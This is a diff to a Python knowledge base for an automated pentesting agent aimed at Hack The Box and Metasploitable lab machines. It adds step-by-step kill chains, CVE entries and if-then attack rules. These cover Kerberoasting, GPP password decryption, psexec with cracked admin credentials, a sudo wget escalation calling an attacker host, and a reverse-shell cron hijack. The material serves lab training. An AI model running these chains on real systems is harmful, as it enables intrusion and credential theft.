+                          "sammy:cooldude!", "cooldude"),
+            KillChainStep("privilege_escalation", "sudo wget --use-askpass=<script> http://attacker/",
+                          "GTFOBins: sudo wget --use-askpass for root",
+                          "wget with --use-askpass executes an arbitrary program to get the password. "
+                          "This can be abused to run commands as root.",
+                          "root@sunday:#", "root"),
+        ),
+    ),
+    KillChain(
+        name="htb_ofbiz_derby_hash_crack",
+        description="Apache OFBiz CVE-2023-49070 → shell → Derby DB hash extraction → su root (Bizness)",
+        target_profile="generic",
+        difficulty="medium",
+        reasoning="Enterprise Java applications store credentials in embedded databases. Extract hashes "
+                  "from raw database files, identify the hash format, and crack for password reuse to root.",
+        total_expected_reward=400.0,
+        steps=(
+            KillChainStep("recon", "nmap -sV -p 80,443 {target}", "Scan for HTTPS web services",
+                          "OFBiz and similar enterprise apps often run on HTTPS.",
+                          "443/tcp open ssl/http nginx", "nginx"),
+            KillChainStep("enumeration", "gobuster dir -u https://{target} -k -w raft-medium-directories.txt",
+                          "Find hidden admin paths",
+                          "Look for /accounting, /webtools, /control, /admin paths.",
+                          "/accounting/control/main", "accounting"),
+            KillChainStep("exploitation", "Exploit CVE-2023-49070 (OFBiz XML-RPC pre-auth RCE)",
+                          "Pre-auth RCE via XML-RPC deserialization",
+                          "Apache OFBiz ≤18.12 has pre-auth RCE via XML-RPC. Use ysoserial payload.",
+                          "ofbiz@target:$", "ofbiz"),
+            KillChainStep("privilege_escalation",
+                          "find /opt/ofbiz -name '*.dat' -exec grep -l 'password\\|hash' {} \\;",
+                          "Search Derby database files for password hashes",
+                          "Derby stores data in .dat files. grep for SHA1/bcrypt/MD5 patterns.",
+                          "seg0/c180.dat", "dat"),
+            KillChainStep("privilege_escalation",
+                          "Extract SHA1 hash → python3 decode_base64_salt → hashcat -m 120",
+                          "Decode and crack the extracted hash",
+                          "Derby may store passwords as SHA1(salt+password) in base64. Decode, identify "
+                          "format, and crack with hashcat mode 120 (sha1($salt.$pass)).",
+                          "monkeybizness", "monkey"),
+            KillChainStep("privilege_escalation", "su root (with cracked password)",
+                          "Switch to root with cracked password",
+                          "Application admin passwords are often reused as system root passwords.",
+                          "root@Bizness:#", "root"),
+        ),
+    ),
+    KillChain(
+        name="htb_ad_gpp_kerberoast",
+        description="SMB Replication share → GPP cPassword → Kerberoasting → Admin hash → psexec (Active)",
+        target_profile="generic",
+        difficulty="medium",
+        reasoning="Active Directory Group Policy Preferences store AES-encrypted passwords in SYSVOL. "
+                  "Microsoft published the key, so ALL GPP passwords are trivially decryptable. Use "
+                  "the decrypted creds to Kerberoast service accounts and crack their hashes for admin.",
+        total_expected_reward=500.0,
+        steps=(
+            KillChainStep("recon", "nmap -sV -p 88,135,139,389,445 {target}", "Scan for AD services",
+                          "Kerberos(88), RPC(135), SMB(139,445), LDAP(389) = Active Directory Domain Controller.",
+                          "88/tcp open kerberos... 445/tcp open microsoft-ds", "kerberos"),
+            KillChainStep("enumeration", "smbclient -N -L //{target} → smbclient //{target}/Replication",
+                          "List SMB shares — access Replication/SYSVOL anonymously",
+                          "SYSVOL/Replication shares often allow anonymous read. Look for Groups.xml.",
+                          "Groups.xml", "Groups"),
+            KillChainStep("exploitation",
+                          "cat Groups.xml → extract cPassword → gpp-decrypt <hash>",
+                          "Decrypt GPP cPassword from Groups.xml",
+                          "Microsoft AES key for GPP: 4e 99 06 e8 fc b6 6c ce 9f b8 85 03 82 04 28 86. "
+                          "gpp-decrypt handles this automatically. Gets SVC_TGS credentials.",
+                          "SVC_TGS:GPPstillStandingStrong2k18", "SVC_TGS"),
+            KillChainStep("exploitation",
+                          "GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request -dc-ip {target}",
+                          "Kerberoast: Request TGS for service accounts",
+                          "With valid domain credentials, request TGS tickets. These are encrypted with "
+                          "the service account's NTLM hash and crackable offline.",
+                          "$krb5tgs$23$*Administrator*...", "krb5tgs"),
+            KillChainStep("privilege_escalation",
+                          "hashcat -m 13100 tgs_hash.txt rockyou.txt",
+                          "Crack Kerberos TGS hash → Administrator password",
+                          "Kerberos TGS hashes crack fast with hashcat mode 13100.",
+                          "Administrator:Ticketmaster1968", "Ticketmaster"),
+            KillChainStep("post_exploitation",
+                          "psexec.py active.htb/Administrator:Ticketmaster1968@{target}",
+                          "PsExec as Domain Administrator",
+                          "Full domain compromise via psexec with admin credentials.",
+                          "nt authority\\system", "system"),
+        ),
+    ),
+    KillChain(
+        name="htb_js2py_sqlite_backup",
+        description="Flask js2py sandbox escape → SQLite hash dump → SSH → sudo backup tool root (CodePartTwo)",
+        target_profile="generic",
+        difficulty="medium",
+        reasoning="Web apps using js2py to evaluate user JavaScript are vulnerable to Python sandbox "
+                  "escape. Application databases contain user hashes. Backup tools with sudo and "
+                  "configurable paths can be abused to read /root.",
+        total_expected_reward=350.0,
+        steps=(
+            KillChainStep("recon", "nmap -sV -p 22,8000 {target}", "Scan for SSH and web app",
+                          "Gunicorn/Flask on high ports is common for Python web apps.",
+                          "22/tcp open ssh... 8000/tcp open http Gunicorn", "Gunicorn"),
+            KillChainStep("enumeration", "Download app.zip → check requirements.txt for js2py version",
+                          "Identify vulnerable dependencies",
+                          "requirements.txt reveals exact versions. js2py 0.74 = CVE-2024-28397 sandbox escape.",
+                          "js2py==0.74", "js2py"),
+            KillChainStep("exploitation",
+                          "Submit CVE-2024-28397 payload via code editor → sandbox escape → RCE",
+                          "js2py sandbox escape → Python subprocess.Popen",
+                          "Navigate Python MRO from JavaScript: Object → __class__ → __base__ → __subclasses__ "
+                          "→ find subprocess.Popen → execute arbitrary commands.",
+                          "app@target:$", "app@"),
+            KillChainStep("privilege_escalation",
+                          "sqlite3 instance/users.db 'SELECT * FROM user' → CrackStation MD5",
+                          "Extract and crack user password hashes from SQLite",
+                          "Application databases contain user hashes. MD5 hashes crack instantly online.",
+                          "marco:sweetangelbabylove", "sweet"),
+            KillChainStep("privilege_escalation", "ssh marco@{target}",
+                          "SSH with cracked database credentials",
+                          "Cracked app password = SSH password (password reuse).",
+                          "marco@codeparttwo:~$", "marco@"),
+            KillChainStep("privilege_escalation",
+                          "sudo -l → modify npbackup config to backup /root → sudo npbackup-cli -c custom -b",
+                          "Abuse sudo backup tool to read /root",
+                          "Modify backup config to target /root directory. Restore backup to read root flag.",
+                          "root.txt", "root"),
+        ),
+    ),
 ]
 
 
 # =============================================================================
-# PPO REASONING INJECTION — WHY and WHEN for each phase
+# HTB WALKTHROUGH-DERIVED CVEs (Phase 7.0 — extracted by Claude from 15 walkthroughs)
 # =============================================================================
+
+HTB_CVES: List[CVEEntry] = [
+    CVEEntry("CVE-2023-38646", "Metabase", "Pre-auth RCE via setup-token and JDBC H2 payload",
+             "Manual: GET /api/session/properties → POST /api/setup/validate",
+             "root shell", "Setup-token leak + H2 DB JDBC allows arbitrary command execution (Analytics box)"),
+    CVEEntry("CVE-2023-2640", "Linux Kernel (OverlayFS)", "Ubuntu local privilege escalation via OverlayFS",
+             "Single-command exploit using unshare + overlay mount",
+             "root", "Ubuntu 22.04 kernels 5.15-6.2 have OverlayFS bug allowing cap_setuid bypass (Analytics)"),
+    CVEEntry("CVE-2023-32629", "Linux Kernel (OverlayFS)", "Ubuntu OverlayFS privesc (companion to CVE-2023-2640)",
+             "Combined with CVE-2023-2640 for reliable exploit",
+             "root", "OverlayFS permission checking flaw in Ubuntu kernels (Analytics)"),
+    CVEEntry("CVE-2023-0386", "Linux Kernel (OverlayFS/FUSE)", "OverlayFS/FUSE local privilege escalation",
+             "Compile OverlayFS exploit for target kernel",
+             "root", "Generic Linux kernel vuln, broader than Ubuntu-specific CVE-2023-2640 (TwoMillion)"),
+    CVEEntry("CVE-2023-30253", "Dolibarr CRM", "PHP code injection in Dolibarr 17.0.0",
+             "python3 exploit.py http://target admin admin LHOST LPORT",
+             "www-data shell", "PHP code injection bypasses restrictions in Dolibarr ERP/CRM (BoardLight)"),
+    CVEEntry("CVE-2022-37706", "Enlightenment DE", "SUID privilege escalation in Enlightenment window manager",
+             "./exploit.sh (pre-built PoC)", "root",
+             "Enlightenment SUID binary has path traversal allowing arbitrary root code execution (BoardLight)"),
+    CVEEntry("CVE-2023-49070", "Apache OFBiz", "Pre-auth RCE via XML-RPC deserialization in OFBiz ≤18.12",
+             "ysoserial payload via XML-RPC endpoint",
+             "application shell", "XML-RPC endpoint deserializes untrusted Java objects (Bizness)"),
+    CVEEntry("CVE-2023-27163", "Request Baskets", "SSRF in Request Baskets ≤1.2.1",
+             "Create basket with forward_url pointing to internal services",
+             "internal access", "Basket forwarding allows SSRF to reach filtered/internal services (Sau)"),
+    CVEEntry("CVE-2014-0160", "OpenSSL (Heartbleed)", "Memory leak in OpenSSL TLS heartbeat extension",
+             "nmap --script ssl-heartbleed OR python3 heartbleed.py",
+             "info-disclosure", "Leaks 64KB of server memory per request — passwords, keys, sessions (Valentine)"),
+    CVEEntry("CVE-2024-28397", "js2py", "Sandbox escape in js2py ≤0.74 allowing arbitrary Python execution",
+             "JavaScript payload navigating Python MRO to subprocess.Popen",
+             "application shell", "js2py eval_js allows escaping JS sandbox to run Python commands (CodePartTwo)"),
+    CVEEntry("CVE-2015-3306", "ProFTPD", "mod_copy unauthenticated file copy in ProFTPD 1.3.5",
+             "SITE CPFR /etc/passwd; SITE CPTO /var/www/html/passwd",
+             "file write → shell", "mod_copy allows copying files without authentication (MS3 and HTB)"),
+    CVEEntry("CVE-2011-2523", "vsftpd", "Backdoor in vsftpd 2.3.4 source distribution",
+             "exploit/unix/ftp/vsftpd_234_backdoor",
+             "root shell", "Deliberate backdoor: :) in username triggers bind shell on port 6200 (MS2)"),
+    CVEEntry("CVE-2007-2447", "Samba", "Username map script command injection in Samba 3.0.20-3.0.25rc3",
+             "exploit/multi/samba/usermap_script",
+             "root shell", "Shell metacharacters in username trigger command injection (MS2)"),
+    CVEEntry("MS11-046", "Windows Kernel", "afd.sys privilege escalation in Windows 7 Build 7600",
+             "40564.exe (compiled exploit)",
+             "SYSTEM", "AFD driver buffer overflow for kernel-level privesc on Win7/2008 (Devel)"),
+]
+
+
+# =============================================================================
+# HTB WALKTHROUGH DECISION RULES — Human-like reasoning patterns
+# Extracted from 15 HTB walkthroughs — teaches agents to think like a pentester
+# =============================================================================
+
+HTB_DECISION_RULES = [
+    # Service recognition → immediate action rules
+    {"if": "vsftpd 2.3.4 detected", "then": "exploit backdoor immediately (CVE-2011-2523)",
+     "reasoning": "100% reliable instant root. No other enumeration needed.", "priority": 1},
+    {"if": "UnrealIRCd 3.2.8.1 detected", "then": "exploit backdoor (Metasploit unreal_ircd_3281_backdoor)",
+     "reasoning": "Instant shell via backdoor. Version-specific, extremely reliable.", "priority": 1},
+    {"if": "Samba 3.0.20 detected", "then": "exploit usermap_script (CVE-2007-2447)",
+     "reasoning": "Pre-auth RCE to root. No credentials needed.", "priority": 1},
+    {"if": "port 1524 open", "then": "telnet to port 1524 for instant root",
+     "reasoning": "Ingreslock bindshell = free root shell, no exploit needed.", "priority": 1},
+    {"if": "r-services (512-514) open", "then": "rsh -l root or rlogin -l root",
+     "reasoning": "Trust-based auth with root access. Instant root.", "priority": 1},
+
+    # Web enumeration rules
+    {"if": "only port 80 open (besides SSH)", "then": "gobuster directories + ffuf vhost subdomains",
+     "reasoning": "Single web port = attack surface is web. Enumerate BOTH directories AND vhosts.", "priority": 2},
+    {"if": "HTTP redirects to hostname.htb", "then": "add to /etc/hosts + fuzz subdomains",
+     "reasoning": "Virtual hosting means hidden apps on subdomains. ALWAYS fuzz.", "priority": 2},
+    {"if": "web app with login page", "then": "try admin:admin, admin:password BEFORE brute force",
+     "reasoning": "Default credentials are faster and less noisy than brute force.", "priority": 2},
+    {"if": "web app version visible", "then": "searchsploit/Google for CVE",
+     "reasoning": "Known version = likely known CVE. Check IMMEDIATELY.", "priority": 2},
+    {"if": "sequential IDs in URLs (/data/5, /user/3)", "then": "test IDOR with /data/0, /user/1",
+     "reasoning": "IDOR is extremely common and easy to exploit. Always test ID=0.", "priority": 2},
+
+    # Credential hunting rules
+    {"if": "shell obtained as www-data", "then": "cat config.php, .env, wp-config.php, conf.php",
+     "reasoning": "Web app config files contain DB credentials that are reused for SSH.", "priority": 3},
+    {"if": "database access obtained", "then": "dump user table → extract hashes → crack",
+     "reasoning": "App user hashes often reuse the system user's password.", "priority": 3},
+    {"if": "container/Docker shell obtained", "then": "env | grep -i pass",
+     "reasoning": "Container environments leak credentials as environment variables.", "priority": 3},
+    {"if": "PCAP/network capture found", "then": "tshark -Y ftp to extract cleartext creds",
+     "reasoning": "FTP/Telnet/HTTP transmit credentials in cleartext.", "priority": 3},
+
+    # Privilege escalation rules
+    {"if": "linux user shell obtained", "then": "sudo -l && find SUID && getcap && check crontab",
+     "reasoning": "Always enumerate ALL privesc vectors before attempting any one.", "priority": 3},
+    {"if": "sudo systemctl available", "then": "sudo systemctl status anything → !sh",
+     "reasoning": "systemctl pager (less) allows shell escape with !sh.", "priority": 3},
+    {"if": "python3 with cap_setuid", "then": "python3 -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'",
+     "reasoning": "cap_setuid on python = instant root. No exploit needed.", "priority": 3},
+    {"if": "writable cron script running as root", "then": "replace with reverse shell",
+     "reasoning": "Cron will execute the modified script as root on next run.", "priority": 3},
+    {"if": "tmux/screen session running as root", "then": "tmux -S /path/to/socket attach",
+     "reasoning": "Root sessions with accessible sockets = instant root.", "priority": 3},
+    {"if": "kernel version 5.x-6.2 on Ubuntu", "then": "try OverlayFS CVE-2023-2640",
+     "reasoning": "Single-command root exploit for modern Ubuntu kernels.", "priority": 3},
+    {"if": "Windows whoami /priv shows SeImpersonatePrivilege", "then": "PrintSpoofer or JuicyPotato",
+     "reasoning": "Token impersonation = guaranteed SYSTEM on Windows.", "priority": 3},
+]
+
+
+# =============================================================================
+# HTB CVE → SERVICE MAPPING (for SmartCoach rapid exploit selection)
+# =============================================================================
+
+HTB_CVE_SERVICE_MAP = {
+    "Metabase": ["CVE-2023-38646"],
+    "Dolibarr": ["CVE-2023-30253"],
+    "Apache OFBiz": ["CVE-2023-49070"],
+    "Request Baskets": ["CVE-2023-27163"],
+    "OpenSSL": ["CVE-2014-0160"],
+    "js2py": ["CVE-2024-28397"],
+    "ProFTPD 1.3.5": ["CVE-2015-3306"],
+    "vsftpd 2.3.4": ["CVE-2011-2523"],
+    "Samba 3.0.20": ["CVE-2007-2447"],
+    "Enlightenment": ["CVE-2022-37706"],
+    "UnrealIRCd 3.2.8.1": ["CVE-2017-2510"],
+    "Ubuntu 22.04 kernel 5.15-6.2": ["CVE-2023-2640", "CVE-2023-32629"],
+    "Linux kernel OverlayFS": ["CVE-2023-0386"],
+    "Windows 7 Build 7600": ["MS11-046"],
+    "Maltrail 0.53": ["unauthenticated OS command injection"],
+}
+
 
 PHASE_REASONING = {
     "recon": {
@@ -1483,6 +2209,9 @@ def get_knowledge_pack(target_profile: str) -> Dict[str, Any]:
         return {
             "patterns": HTB_COMMON_PATTERNS,
             "kill_chains": HTB_KILL_CHAINS,
+            "cves": HTB_CVES,
+            "decision_rules": HTB_DECISION_RULES,
+            "cve_service_map": HTB_CVE_SERVICE_MAP,
         }
     else:
         return {
@@ -1541,14 +2270,26 @@ def get_mentor_knowledge_text(target_profile: str = "metasploitable2") -> str:
             lines.append(f"    MODULE: {cve.module}")
     
     elif target_profile in ("htb", "hackthebox"):
-        lines.append("\n=== HACK THE BOX COMMON PATTERNS ===")
+        lines.append("\n=== HACK THE BOX COMMON PATTERNS (from 15 walkthrough analyses) ===")
         lines.append("HTB boxes follow common patterns. Master these and you solve 80% of boxes.\n")
         
         for pattern_name, pattern in HTB_COMMON_PATTERNS.items():
             if isinstance(pattern, dict) and "techniques" in pattern:
                 lines.append(f"\n{pattern_name.upper().replace('_', ' ')}:")
                 for tech in pattern["techniques"]:
-                    lines.append(f"  • {tech['name']}: {tech['reasoning'][:100]}")
+                    lines.append(f"  • {tech['name']}: {tech['reasoning'][:120]}")
+        
+        lines.append("\n\n=== HTB CVEs (from walkthrough analysis) ===")
+        for cve in HTB_CVES:
+            lines.append(f"  • {cve.cve_id} ({cve.service}): {cve.description}")
+            lines.append(f"    EXPLOIT: {cve.module}")
+        
+        lines.append("\n\n=== HTB DECISION RULES (human-like pentester reasoning) ===")
+        for rule in sorted(HTB_DECISION_RULES, key=lambda r: r.get("priority", 99)):
+            lines.append(f"  IF: {rule['if']}")
+            lines.append(f"  THEN: {rule['then']}")
+            lines.append(f"  WHY: {rule['reasoning']}")
+            lines.append("")
     
     return "\n".join(lines)
 
@@ -1566,5 +2307,6 @@ def format_service_table(target_profile: str = "metasploitable2") -> str:
     return "\n".join(lines)
 
 
-logger.info("Knowledge packs loaded: MS2 (%d services), MS3 (%d services), HTB (%d patterns)",
-            len(MS2_SERVICES), len(MS3_SERVICES), len(HTB_COMMON_PATTERNS))
+logger.info("Knowledge packs loaded: MS2 (%d services), MS3 (%d services), HTB (%d patterns, %d CVEs, %d kill chains, %d decision rules)",
+            len(MS2_SERVICES), len(MS3_SERVICES), len(HTB_COMMON_PATTERNS),
+            len(HTB_CVES), len(HTB_KILL_CHAINS), len(HTB_DECISION_RULES))
